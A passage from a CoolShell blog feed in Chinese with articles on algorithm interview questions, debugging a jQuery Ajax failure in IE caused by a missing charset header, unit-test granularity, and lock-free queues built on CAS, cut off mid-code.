<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BA%89%E8%AE%BA" title="争论">争论</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%B0%8F%E7%BB%93" title="小结">小结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%8A%9F%E8%83%BD%E6%80%A7%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90"></span>功能性需求分析<span class="ez-toc-section-end"></span>
</h4>
<p>试想，如果我们在实际工作中得到这样一个题 我们会怎么做？我一定会分析这个需求，因为我害怕需求未来会改变，今天你叫我找一个第2大的数，明天你找我找一个第4大的数，后天叫我找一个第100大的数，我不搞死了。需求变化是很正常的事。分析完这个需求后，我会很自然地去写找第K大数的算法——难度一下子就增大了。</p>
<p><span id="more-8138"></span></p>
<p>很多人会以为找第K大的需求是一种“过早扩展”的思路，不是这样的，我相信我们在实际编码中写过太多这样的程序了，你一定不会设计出这样的函数接口—— Find2ndMaxNum(int* array, int len)，就好像你不会设计出 DestroyBaghdad(); 这样的接口，而是设计一个DestoryCity( City&amp; ); 的接口，而把Baghdad当成参数传进去！所以，你应该是声明一个叫FindKthMaxNum(int* array, int len, int kth)，把2当成参数传进去。<strong>这是最基本的编程方法，用数学的话来说，叫代数</strong>！最简单的需求分析方法就是把需求翻译成函数名，然后看看是这个接口不是很二？！</p>
<p>（注：不要纠结于FindMaxNum()或FindMinNum()，因为这两个函数名的业务意义很清楚了，不像Find2ndMaxNum()那么二）</p>
<h4>
<span class="ez-toc-section" id="%E9%9D%9E%E5%8A%9F%E8%83%BD%E6%80%A7%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90"></span>非功能性需求分析<span class="ez-toc-section-end"></span>
</h4>
<p>性能之类的东西从来都是非功能性需求，对于算法题，我们太喜欢研究算法题的空间和时间复杂度了。我们希望做到空间和时间双丰收，这是算法学术界的风格。所以，<strong>习惯于标准答案的我们已经失去思考的能力，只会机械地思考算法之内的性能，而忽略了算法之外的性能</strong>。</p>
<p>如果题目是——“从无序数组中找到第K个最大的数”，那么，我们一定会去思考用O(n)的线性算法找出第K个数。事实上，也有线性算法——STL中可以用nth_element求得类似的第n大的数，其利用快速排序的思想，从数组S中随机找出一个元素X，把数组分为两部分Sa和Sb。Sa中的元素大于等于X，Sb中元素小于X。这时有两种情况：1）Sa中元素的个数小于k，则Sb中的第k-|Sa|个元素即为第k大数；2） Sa中元素的个数大于等于k，则返回Sa中的第k大数。时间复杂度近似为O(n)。</p>
<p>搞学术的nuts们到了这一步一定会欢呼胜利！但是他们哪里能想得到性能的需求分析也是来源自业务的！</p>
<p><strong>我们一说性能，基本上是个人都会问，请求量有多大？如果我们的FindKthMaxNum()的请求量是m次，那么你的这个每次都要O(n)复杂度的算法得到的效果就是O(n*m)，这一点，是书呆子式的学院派人永远想不到的。</strong>因为应试教育让我们不会从实际思考了。</p>
<h4>
<span class="ez-toc-section" id="%E5%B7%A5%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%A7%A3%E6%B3%95"></span>工程式的解法<span class="ez-toc-section-end"></span>
</h4>
<p>根据上面的需求分析，有软件工程经验的人的解法通常会这样：</p>
<p style="padding-left: 30px;">1）把数组排序，从大到小。</p>
<p style="padding-left: 30px;">2）于是你要第k大的数，就直接访问 array[k]。</p>
<p>排序只需要一次，O(n*log(n))，然后，接下来的m次对FindKthMaxNum()的调用全是O(1)的，整体复杂度反而成了线性的。</p>
<p>其实，上述的还不是工程式的最好的解法，因为，在业务中，那数组中的数据可能会是会变化的，所以，如果是用数组排序的话，有数据的改动会让我重新排序，这个太耗性能了，如果实际情况中会有很多的插入或删除操作，那么可以考虑使用B+树。</p>
<p>工程式的解法有以下特点：</p>
<p style="padding-left: 30px;">1）很方便扩展，因为数据排好序了，你还可以方便地支持各种需求，如从第k1大到k2大的数据（那些学院派写出来的代码在拿到这个需求时又开始挠头苦想了）</p>
<p style="padding-left: 30px;">2）规整的数据会简化整体的算法复杂度，从而整体性能会更好。（公欲善其事，必先利其器）</p>
<p style="padding-left: 30px;">3）代码变得清晰，易懂，易维护！（学院派的和STL一样的近似O(n)复杂度的算法没人敢动）</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%89%E8%AE%BA"></span>争论<span class="ez-toc-section-end"></span>
</h4>
<p>你可能会和我有以下争论，</p>
<ul>
<li>
<strong>如果程序员做这个算法题用排序的方式，他一定不会像你想那么多</strong>。是的，你说得对。但是我想说，很多时候，我们直觉地思考，恰恰是正确的路。因为“排序”这个思路符合人类大脑处理问题的方式，而使用学院派的方式是反大脑直觉的。反大脑直觉的，通常意味着晦涩难懂，维护成本上升。</li>
</ul>
<ul>
<li>
<strong>就是一道面试题，我就是想测试一下你的算法技能，这也扯太多了</strong>。没问题，不过，我们要清楚我们是在招什么人？是一个只会写算法的人，还是一个会做软件的人？这个只有你自己最清楚。</li>
</ul>
<ul>
<li>
<strong>这个算法题太容易诱导到学院派的思路了</strong>。是的这道“找出第K大的数”，其实可以变换为更为业务一点的题目——“<strong>我要和别的商户竞价，我想排在所有竞争对手报价的第K名，请写一个程序，我输入K，和一个商品名，系统告诉我应该订多少价？</strong>（商家的所有商品的报价在一数组中）”——业务分析，整体性能，算法，数据结构，增加需求让应聘者重构，这一个问题就全考了。</li>
</ul>
<ul>
<li>
<strong><span style="color: #ff0000;">你是不是在说算法不重要，不用学？</span></strong>千万别这样理解我，搞得好像如果面试不面，我就可以不学。<strong>算法很重要，算法题能锻炼我们的思维，而且也有很多实际用处</strong>。我这篇文章不是让大家不要去学算法，这是完全错误的，我是让大家带着业务问题去使用算法。问你业务问题，一样会问到算法题上来。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%B0%8F%E7%BB%93"></span>小结<span class="ez-toc-section-end"></span>
</h4>
<p>看过这上面的分析，我相信你明白我为什么反对纯算法面试题了。原因就是<strong>纯算法的面试题根本不能反应一个程序的综合素质</strong>！</p>
<p>那么，在面试中，我们应该要考量程序员的那些综合素质呢？我以为有下面这些东西：</p>
<ol>
<li>会不会做需求分析？怎么理解问题的？</li>
<li>解决问题的思路是什么？想法如何？</li>
<li>会不会对基础的算法和数据结构灵活运用？</li>
</ol>
<p>另外，我们知道，对于软件开发来说，在工程上，难是的下面是这些挑战：</p>
<ul>
<li>软件的维护成本远远大于软件的开发成本。</li>
<li>软件的质量变得越来越重要，所以，测试工作也变得越来越重要。</li>
<li>软件的需求总是在变的，软件的需求总是一点一点往上加的。</li>
<li>程序中大量的代码都是在处理一些错误的或是不正常的流程。</li>
</ul>
<p>所以，对于编程能力上，我们应该主要考量程序员的如下能力：</p>
<ol>
<li>设计是否满足对需求的理解，并可以应对可能出现的需求变化。</li>
<li>程序是否易读，易维护？</li>
<li>重构代码的能力如何？</li>
<li>会不会测试自己写好的程序？</li>
</ol>
<p>所以，这段时间，我越来越倾向于问应聘者一些有业务意义的题，而且应增加或更改需求来看程序员的重构代码的能力，写完程序后，让应聘者设计测试案例。</p>
<p>比如：解析加减乘除表达式，字符串转数字，洗牌程序，口令生成器，通过ip地址找地点，英汉词典双向检索……</p>
<p><strong>总之，我反对纯算法面试题！</strong></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-08-22T08:20:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/8138.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一次Ajax查错的经历 ]]></title>
<link>https://coolshell.cn/articles/8170.html</link>
<content><![CDATA[ 
<p>先说故事，再说想法吧。</p>
<p>我有一朋友做网站，用jQuery的Ajax方法从后端载入一段HTML代码然后动态插入到网页的Div元件中。这个东西太普遍了。jQuery强大的load方法可以完成这个事情。朋友的代码是这么写的：</p>
<p>[javascript]var tab = jQuery("#dynamic_tab");<br>
var url = "/list_ajax/";<br>
tab.load(url);[/javascript]</p>
<p>简单到不能再简单了。在Chrome，Firefox，Safari下运行一点问题也没有，只有IE不行，不管是IE7，IE8，还是IE9。问题的症壮是，使用IE访问那个Ajax的链接，没有问题，但是在jQuery的Ajax方法返回了“undefined”的respons对象。没有任何报错！</p>
<p>怎么搞也搞不定，只好Google了一下——“<a href="https://www.google.com/#hl=zh-CN&amp;newwindow=1&amp;site=&amp;source=hp&amp;q=jQuery+load+IE&amp;btnK=Google+%E6%90%9C%E7%B4%A2&amp;oq=jQuery+load+IE" target="_blank">jQuery load IE</a>”，一看，很多人都在问这个问题。于是开始了<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">散弹枪编程方式</a>。</p>
<p>排在第一的就是StackOverflow被浏览了33K次的这个问题：<a href="https://stackoverflow.com/questions/1061525/jquerys-load-not-working-in-ie-but-fine-in-firefox-chrome-and-safari" target="_blank">jQuery’s .load() not working in IE – but fine in Firefox, Chrome and Safari</a>，答案没有被打勾（不靠谱），StackOverflow还有很多人问相似的问题，不过都没有答案。不管三七二十一，先试了一下，散弹枪嘛。试了半天都没有用。</p>
<p>然后上Google查，又看到有人说的IE缓存的问题，什么，要把cache设置成false，或是用下面的方法来解决：</p>
<p>[javascript]var tab = jQuery("#dynamic_tab");<br>
var fuckie = Math.random();<br>
var url = "/list_ajax/"+"?fuckie="+fuckie;<br>
tab.load(url);[/javascript]</p>
<p>反正还是一样，统统不Work，几乎所有的都试了，都不Work。搞了一天的朋友恼怒道：“Microsoft应该快点倒闭吧，产品太烂了”。IE的确是太烂了。</p>
<p><span id="more-8170"></span></p>
<p>于是我用IE9的网页调试器可以看到点了Ajax的链接后，<strong>IE对网站有http的Ajax请求，也可以看到请求返回了，但是就是不显示在我的页面上——jQuery的Ajax的responseText为undefined!</strong></p>
<p>对于我这个老家伙，对jQuery也不熟，我只得开始调试jQuery的代码，想看看里面干了什么，报了什么错？调了一个小时，基本上把jQuery的Ajax的封装看懂了七七八八了，但是还是没找到为什么有问题。</p>
<p>于是，我只得架起原生态的Ajax，看看IE的那个Ajax的ActiveX的对象干了什么事？写了下面的代码（当年写Ajax就是这么写的，所以也不费劲，况且网上还有例程可以抄）：</p>
<p>[javascript]<br>
function InitAjax()<br>
{<br>
var ajax=false;<br>
try {<br>
ajax = new ActiveXObject("Msxml2.XMLHTTP");<br>
} catch (e) {<br>
try {<br>
ajax = new ActiveXObject("Microsoft.XMLHTTP");<br>
} catch (E) {<br>
ajax = false;<br>
}<br>
}<br>
if (!ajax &amp;&amp; typeof XMLHttpRequest!=’undefined’) {<br>
ajax = new XMLHttpRequest();<br>
}<br>
return ajax;<br>
}</p>
<p>var ajax = InitAjax();<br>
ajax.open("GET", url, true);<br>
ajax.onreadystatechange = function() {<br>
if (ajax.readyState == 4 &amp;&amp; ajax.status == 200) {<br>
var show = document.getElementById("HaoChenDIV").value;<br>
show.innerHTML = ajax.responseText;<br>
}<br>
}<br>
ajax.send(null);<br>
[/javascript]</p>
<p>一运行，还是不行，没见IE报什么错，不过，可以确定这不是jQuery的问题了，估计还是我们自己程序的问题。不过此时的程序太好调试了，调试中，在IE9下调式发现原生的IE的Ajax对象在onreadystatechange函数里，其responseText是下面这个样子：</p>
<p><img alt="image placeholder" ></p>
<p>什么是“<strong>系统错误: -1072896658</strong>”？上<a href="https://www.google.com/#hl=zh-CN&amp;newwindow=1&amp;q=ajax+%22%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF:+-1072896658%22&amp;oq=ajax+%22%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF:+-1072896658%22" target="_blank">google一查</a>，一堆页面，基本上是说乱码了，也就是ajax的后端程序返回的网页编码不认识吧。需要在返回的http header里加上 charset=utf-8。</p>
<p>于是，修改后端的Ajax的程序，明确指定了返回的HTTP Header中的charset，于是IE下就工作正常了，再切回jQuery的load代码，一切正常了（后端的程序本来是utf-8的编码格式，但是不骨明确在HTTP Header中指定，但是只有IE不会自动检测）。</p>
<p>这个问题的原因就是因为我们没有按照规范去写网页。所以，举一反三，HTML的规范还有哪些，太多了，记也记不住。但也许你会知道<strong>有一个叫 <a href="https://validator.w3.org" target="_blank">http://validator.w3.org</a> 的网站可以帮你校验你网页中的很多不规范的东西</strong>。这个工具会报很多很多错，很多都有点吹毛求疵，不过，可以让你看看（注：今天的coolshell装了很多插件，也被我调过一些东西，所以出错很多，我还记得以前没有插件没有我定制化的样式的时候，Wordpress一个错都不报）。</p>
<h4>后记</h4>
<p>我把这个问题和过程分享出来，主要有这么几个目的，并抛出几个问题，大家可以思考一下：</p>
<p style="padding-left: 30px;">1）这个问题网上有很多人都在报，但是基本上找不到答案（包括StackOverflow），所以，我分享出来，填补一下空白。</p>
<p style="padding-left: 30px;">2）我相信我们的程序员天天都在经历这样的事，我不知道大家在遇到这样的事情会怎么做？也许大多数人都在网上查各种解决方案，然后一个一个的试，直到试对了——散弹枪式的编程，呵呵。当然，大多数答案都是可能找到的。但<strong>当我们找到答案了后，我们还会深入去了解这个问题的具体原因并举一反三地去思考一其周边的东西吗</strong>？</p>
<p style="padding-left: 30px;">3）另外，在今天这样N多框架，N多lib，N多开源的年代下，<strong>不知道大家有没有失去了从零开始自己写代码的能力？</strong>比如上面的这个问题，不知道有多少人还会自己写原生态的Ajax？不过，我还是建议大家能在使用各种框架的时候，明白那些最基础的知识，求甚解，知其然知其所以然，真的很重要。</p>
<p>我是从那个“吃糠的年代”过来的程序员，那时的程序员什么都要自己干，很辛苦，今天我和很多人说我以前的那些经历，会被笑话，但是我从这些什么都自己的干的年代过的经历，让我受益很多。我把我的想法分享给大家，希望对大家有用。</p>
<p>(全文完)</p>
 ]]></content>
<pubDate>2012-08-27T14:56:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/8170.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “单元测试要做多细？” ]]></title>
<link>https://coolshell.cn/articles/8209.html</link>
<content><![CDATA[ 
<p>这篇文章主要来源是StackOverflow上的一个回答——“<a title="How deep are your unit tests?" href="https://stackoverflow.com/questions/153234/how-deep-are-your-unit-tests" target="_blank">How deep are your unit tests?</a>”。一个有13.8K的分的人（<a href="https://stackoverflow.com/users/1116/john-nolan">John Nolan</a>）问了个关于TDD的问题，这个问题并不新鲜，最亮的是这个问题的Best Answer，这个问题是——</p>
<p style="padding-left: 30px;">“TDD需要花时间写测试，而我们一般多少会写一些代码，而第一个测试是测试我的构造函数有没有把这个类的变量都设置对了，这会不会太过分了？那么，我们写单元测试的这个单元的粒度到底是什么样的？并且，是不是我们的测试测试得多了点？”</p>
<h4>答案</h4>
<p>StackOverflow上，这个问题的答案是这样的——</p>
<p style="padding-left: 30px;">“I get paid for code that works, not for tests, so my philosophy is to test as little as possible to reach a given level of confidence (I suspect this level of confidence is high compared to industry standards, but that could just be hubris). If I don’t typically make a kind of mistake (like setting the wrong variables in a constructor), I don’t test for it. I do tend to make sense of test errors, so I’m extra careful when I have logic with complicated conditionals. When coding on a team, I modify my strategy to carefully test code that we, collectively, tend to get wrong.”</p>
<p style="padding-left: 30px;"><strong>老板为我的代码付报酬，而不是测试，所以，我对此的价值观是——测试越少越好，少到你对你的代码质量达到了某种自信</strong>（我觉得这种的自信标准应该要高于业内的标准，当然，这种自信也可能是种自大）。如果我的编码生涯中不会犯这种典型的错误（如：在构造函数中设了个错误的值），那我就不会测试它。<strong>我倾向于去对那些有意义的错误做测试，所以，我对一些比较复杂的条件逻辑会异常地小心</strong>。当在一个团队中，我会非常小心的测试那些会让团队容易出错的代码。</p>
<p>这个回答对TDD似乎有一种否定，<strong>最亮的是这个问题是由<a href="https://en.wikipedia.org/wiki/Kent_Beck" target="_blank">Kent Beck</a>，Kent是XP和TDD的创造者，是敏捷开发实践方法的奠基人</strong>。以致于还有人调侃到——</p>
<p><span id="more-8209"></span></p>
<p><img alt="image placeholder" ></p>
<p style="padding-left: 30px;">The world does not think that Kent Beck would say this! There are legions of developers dutifully pursuing 100% coverage because they think it is what Kent Beck would do! I have told many that you said, in your XP book, that you don’t always adhere to Test First religiously. But I’m surprised too.</p>
<p style="padding-left: 30px;">只是要地球人都不会觉得Kent Beck会这么说啊！我们有大堆程序员在忠实的追求着100%的代码测试覆盖率，因为这些程序员觉得Kent Beck也会这么干！我告诉过很多人，你在你的XP的书里说过，你并不总是支持“宗教信仰式的Test First”，但是今天Kent这么说，我还是很惊讶！</p>
<p>后面还有一些人不同意Kent， 我一下子从这个事中想到了《<a href="https://movie.douban.com/subject/1292000/" target="_blank">fight club</a>》里的那个精神分裂者创建了一个连自己都反对的地下组织。呵呵。</p>
<p>其实我是非常同意Kent的，怎么合适怎么搞，爱怎么测试就怎么测试，只要自己和团队有信心就可以了。没有必要就一定要写测试，一定要测试先行。</p>
<h4>其它答案</h4>
<p>八卦完了，我们还是来认认真真地看看这个问题中其它的其它答案，因为这个问题的也是国人爱问题的问题。</p>
<p><strong>第二个答案：值得借鉴</strong></p>
<ul>
<li>开发过程中，单元测试应该来测试那些可能会出错的地方，或是那些边界情况。</li>
<li>维护过程中，单元测试应该跟着我们的bug report来走，每一个bug都应该有个UT。于是程序员就会对自己的代码变更有两个自信，一是bug 被 fixed，二是相同的bug不会再次出现。</li>
</ul>
<p><strong>第三个答案：给敏捷咨师看的答案</strong></p>
<p>这个答案在说，我们只注意到了TDD中的T，而忽略了第一个D，就是Driven…… bla bla bla… 又这扯这些空洞的东西了，国内的各种不学无术的敏捷咨询师最好这一口了。</p>
<p><strong>第四个答案：致那些什么都要测试的人</strong></p>
<p>如果我们需要测试一个像 <code>int square(int x)</code> 这样的开根函数，我们需要40亿个测试（每个数都要测试）。</p>
<p>事实上这种情况可能还更糟糕，如果有这样一个方法 <code>void setX(int newX)</code> 不会更改其它的成员变量，如：obj.z, Obj.y，那么，你是不是还要去测试一下别的变量没有被改变？</p>
<p>我们只可能测试那些有意义的，确实要测试的案例。</p>
<h4>我的观点</h4>
<p>我在《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并没有看上去的那么美</a>》一文中说过我的观点了，我就不再多说了。我还是把下面这些观点列出来，供大家思考和讨论：</p>
<p style="padding-left: 30px;">1）<strong>我国的教育对我们最大的洗脑不是掩盖事实，而让我们习惯于标准答案，习惯于教条，从而不会思考！敏捷开发中的若干东西似乎都成了软件开发中对某种标准答案的教条，实在是悲哀！</strong></p>
<p style="padding-left: 30px;">2）<strong>软件开发是一种脑力劳动，是一种知识密集型的工作，就像艺术作品一样，创作过程和成品是没有标准答案的。</strong></p>
<p style="padding-left: 30px;">3）<strong>软件的质量不是测试出来的，而是设计和维护出来的。就像工匠们在一点一点地雕琢他们的作品一样。</strong></p>
<p>UT的粒度是多少，这个不重要，重要的是你会不会自己思考你的软件应该怎么做，怎么测试。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-09-03T08:13:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/8209.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 无锁队列的实现 ]]></title>
<link>https://coolshell.cn/articles/8239.html</link>
<content><![CDATA[ 
<p style="text-align: center;"><strong><em>————注：本文于2019年11月4日更新————</em></strong></p>
<p>关于无锁队列的实现，网上有很多文章，虽然本文可能和那些文章有所重复，但是我还是想以我自己的方式把这些文章中的重要的知识点串起来和大家讲一讲这个技术。下面开始正文。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%85%B3%E4%BA%8ECAS%E7%AD%89%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C" title="关于CAS等原子操作">关于CAS等原子操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97%E7%9A%84%E9%93%BE%E8%A1%A8%E5%AE%9E%E7%8E%B0" title="无锁队列的链表实现">无锁队列的链表实现</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98" title="CAS的ABA问题">CAS的ABA问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E8%A7%A3%E5%86%B3ABA%E7%9A%84%E9%97%AE%E9%A2%98" title="解决ABA的问题">解决ABA的问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%94%A8%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97" title="用数组实现无锁队列">用数组实现无锁队列</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#_%E5%B0%8F%E7%BB%93" title=" 小结"> 小结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8ECAS%E7%AD%89%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C"></span>关于CAS等原子操作<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" >在开始说无锁队列之前，我们需要知道一个很重要的技术就是CAS操作——Compare &amp; Set，或是 Compare &amp; Swap，<strong>现在几乎所有的CPU指令都支持CAS的原子操作，X86下对应的是 <span style="color: #ff0000;">CMPXCHG </span>汇编指令。</strong>有了这个原子操作，我们就可以用其来实现各种无锁（lock free）的数据结构。</p>
<p>这个操作用C语言来描述就是下面这个样子：（代码来自<a href="https://en.wikipedia.org/wiki/Compare-and-swap" target="_blank" rel="noopener noreferrer">Wikipedia的Compare And Swap</a>词条）意思就是说，看一看内存<code>*reg</code>里的值是不是<code>oldval</code>，如果是的话，则对其赋值<code>newval</code>。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int compare_and_swap (int* reg, int oldval, int newval)
{
  int old_reg_val = *reg;
  if (old_reg_val == oldval) {
     *reg = newval;
  }
  return old_reg_val;
}
</pre>
<p>我们可以看到，<code>old_reg_val</code> 总是返回，于是，我们可以在 <code>compare_and_swap</code> 操作之后对其进行测试，以查看它是否与 <code>oldval</code>相匹配，因为它可能有所不同，这意味着另一个并发线程已成功地竞争到 <code>compare_and_swap</code> 并成功将 <code>reg</code> 值从 <code>oldval</code> 更改为别的值了。</p>
<p>这个操作可以变种为返回bool值的形式（返回 bool值的好处在于，可以调用者知道有没有更新成功）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">bool compare_and_swap (int *addr, int oldval, int newval)
{
  if ( *addr != oldval ) {
      return false;
  }
  *addr = newval;
  return true;
}</pre>
<p>与CAS相似的还有下面的原子操作：（这些东西大家自己看Wikipedia，也没什么复杂的）</p>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Fetch-and-add" target="_blank" rel="noopener noreferrer">Fetch And Add</a>，一般用来对变量做 +1 的原子操作</li>
<li>
<a title="Test-and-set" href="https://en.wikipedia.org/wiki/Test-and-set">Test-and-set</a>，写值到某个内存位置并传回其旧值。汇编指令BST</li>
<li>
<a title="Test and Test-and-set" href="https://en.wikipedia.org/wiki/Test_and_Test-and-set">Test and Test-and-set</a>，用来低低Test-and-Set的资源争夺情况</li>
</ul>
<p><strong>注：</strong>在实际的C/C++程序中，CAS的各种实现版本如下：</p>
<p><span id="more-8239"></span></p>
<p><strong>1）GCC的CAS</strong></p>
<p style="padding-left: 30px;">GCC4.1+版本中支持CAS的原子操作（完整的原子操作可参看<a href="https://gcc.gnu.org/onlinedocs/gcc-4.1.1/gcc/Atomic-Builtins.html" target="_blank" rel="noopener noreferrer"> GCC Atomic Builtins</a>）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">bool __sync_bool_compare_and_swap (type *ptr, type oldval type newval, ...)
type __sync_val_compare_and_swap (type *ptr, type oldval type newval, ...)</pre>
<p><strong>2）Windows的CAS</strong></p>
<p style="padding-left: 30px;">在Windows下，你可以使用下面的Windows API来完成CAS：（完整的Windows原子操作可参看MSDN的<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms686360(v=vs.85).aspx#interlocked_functions" target="_blank" rel="noopener noreferrer">InterLocked Functions</a>）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c"> InterlockedCompareExchange ( __inout LONG volatile *Target,
                                 __in LONG Exchange,
                                 __in LONG Comperand);</pre>
<p><strong>3) C++11中的CAS</strong></p>
<p style="padding-left: 30px;">C++11中的STL中的atomic类的函数可以让你跨平台。（完整的C++11的原子操作可参看 <a href="http://en.cppreference.com/w/cpp/atomic" target="_blank" rel="noopener noreferrer">Atomic Operation Library</a>）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">template&lt; class T &gt;
bool atomic_compare_exchange_weak( std::atomic* obj,
                                   T* expected, T desired );
template&lt; class T &gt;
bool atomic_compare_exchange_weak( volatile std::atomic* obj,
                                   T* expected, T desired );
</pre>
<h4>
<span class="ez-toc-section" id="%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97%E7%9A%84%E9%93%BE%E8%A1%A8%E5%AE%9E%E7%8E%B0"></span>无锁队列的链表实现<span class="ez-toc-section-end"></span>
</h4>
<p>下面的代码主要参考于两篇论文：</p>
<ul>
<li>John D. Valois 1994年10月在拉斯维加斯的并行和分布系统系统国际大会上的一篇论文——《<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.53.8674&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener noreferrer">Implementing Lock-Free Queues</a>》</li>
<li>美国纽约罗切斯特大学 Maged M. Michael 和 Michael L. Scott 在1996年3月发表的一篇论文 《<a href="https://www.cs.rochester.edu/u/scott/papers/1996_PODC_queues.pdf" target="_blank" rel="noopener noreferrer">Simple, Fast, and Practical Non-Blocking and Blocking ConcurrentQueue Algorithms</a>》</li>
</ul>
<p>（注：下面的代码并不完全与这篇论文相同）</p>
<p>初始化一个队列的代码很简，初始化一个dummy结点（注：在链表操作中，使用一个dummy结点，可以少掉很多边界条件的判断），如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">InitQueue(Q)
{
    node = new node()
    node-&gt;next = NULL;
    Q-&gt;head = Q-&gt;tail = node;
}
</pre>
<p>我们先来看一下进队列用CAS实现的方式，基本上来说就是链表的两步操作：</p>
<ol>
<li>第一步，把tail指针的next指向要加入的结点。 <code>tail-&gt;next = p;</code>
</li>
<li>第二步，把tail指针移到队尾。 <code>tail = p;</code>
</li>
</ol>
<pre class="EnlighterJSRAW" data-enlighter-language="c">EnQueue(Q, data) //进队列
{
    //准备新加入的结点数据
    n = new node();
    n-&gt;value = data;
    n-&gt;next = NULL;

    do {
        p = Q-&gt;tail; //取链表尾指针的快照
    } while( CAS(p-&gt;next, NULL, n) != TRUE); 
    //while条件注释：如果没有把结点链在尾指针上，再试

    CAS(Q-&gt;tail, p, n); //置尾结点 tail = n;
}</pre>
<p>我们可以看到，程序中的那个 do-while 的 Retry-Loop 中的 CAS 操作：如果 <code>p-&gt;next</code> 是 <code>NULL</code>，那么，把新结点 <code>n</code> 加到队尾。如果不成功，则重新再来一次！</p>
<p>就是说，很有可能我在准备在队列尾加入结点时，别的线程已经加成功了，于是tail指针就变了，于是我的CAS返回了false，于是程序再试，直到试成功为止。这个很像我们的抢电话热线的不停重播的情况。</p>
<p>但是你会看到，为什么我们的“置尾结点”的操作（第13行）不判断是否成功，因为：</p>
<ol>
<li>如果有一个线程T1，它的while中的CAS如果成功的话，那么其它所有的 随后线程的CAS都会失败，然后就会再循环，</li>
<li>此时，如果T1 线程还没有更新tail指针，其它的线程继续失败，因为<code>tail-&gt;next</code>不是NULL了。</li>
<li>直到T1线程更新完 <code>tail</code> 指针，于是其它的线程中的某个线程就可以得到新的 <code>tail</code> 指针，继续往下走了。</li>
<li>所以，只要线程能从 while 循环中退出来，意味着，它已经“独占”了，<code>tail</code> 指针必然可以被更新。</li>
</ol>
<p>这里有一个潜在的问题——<strong>如果T1线程在用CAS更新tail指针的之前，线程停掉或是挂掉了，那么其它线程就进入死循环了</strong>。下面是改良版的EnQueue()</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-highlight="10,11">EnQueue(Q, data) //进队列改良版 v1
{
    n = new node();
    n-&gt;value = data;
    n-&gt;next = NULL;

    p = Q-&gt;tail;
    oldp = p
    do {
        while (p-&gt;next != NULL)
            p = p-&gt;next;
    } while( CAS(p.next, NULL, n) != TRUE); //如果没有把结点链在尾上，再试

    CAS(Q-&gt;tail, oldp, n); //置尾结点
}</pre>
<p>我们让每个线程，自己fetch 指针 <code>p</code> 到链表尾。但是这样的fetch会很影响性能。而且，如果一个线程不断的EnQueue，会导致所有的其它线程都去 fetch 他们的 <code>p</code> 指针到队尾，能不能不要所有的线程都干同一个事？这样可以节省整体的时间？</p>
<p>比如：直接 fetch <code>Q-&gt;tail</code> 到队尾？因为，所有的线程都共享着 Q-&gt;tail，所以，一旦有人动了它后，相当于其它的线程也跟着动了，于是，我们的代码可以改进成如下的实现：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">EnQueue(Q, data) //进队列改良版 v2 
{
    n = new node();
    n-&gt;value = data;
    n-&gt;next = NULL;

    while(TRUE) {
        //先取一下尾指针和尾指针的next
        tail = Q-&gt;tail;
        next = tail-&gt;next;

        //如果尾指针已经被移动了，则重新开始
        if ( tail != Q-&gt;tail ) continue;

